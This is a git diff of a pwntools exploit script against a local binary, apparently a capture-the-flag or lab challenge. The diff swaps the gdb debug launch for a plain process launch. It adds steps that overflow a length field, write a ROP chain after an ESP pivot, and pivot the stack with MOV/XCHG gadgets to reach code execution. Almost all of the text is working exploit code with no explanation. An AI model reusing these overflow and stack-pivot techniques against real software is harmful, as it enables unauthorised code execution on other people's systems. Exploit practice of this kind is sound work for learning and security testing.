@@ -47,11 +47,11 @@ def build_rop_chain():
     return rop_chain
 
 
-# p = process(BIN_PATH)
+p = process(BIN_PATH)
 
-p = gdb.debug(BIN_PATH, '''
-break main
-''')
+# p = gdb.debug(BIN_PATH, '''
+# break main
+# ''')
 
 log.info("Message #1 - Overflowing max_len")
 p.recvuntil("Enter Choice:")
@@ -69,4 +69,11 @@ log.info("Message #1 - Write ROP chain (with edit)")
 p.recvuntil("Enter Choice:")
 p.sendline("2")
 p.sendline("0")
+# Change ESP to proper ROP
 p.sendline("x" * (SPACE_BETWEEN_CHUNKS - 132) + ESP_PIVOT + "B" * 0x2C + build_rop_chain())
+
+log.info("Message #2 - Print & write ROP with code execution")
+p.recvuntil("Enter Choice:")
+p.sendline("4")
+# Change ESP to message[1]
+p.sendline("1xxx" + "a"* 8 + MOV_EAX_EDX + XCHG_EAX_ESP)
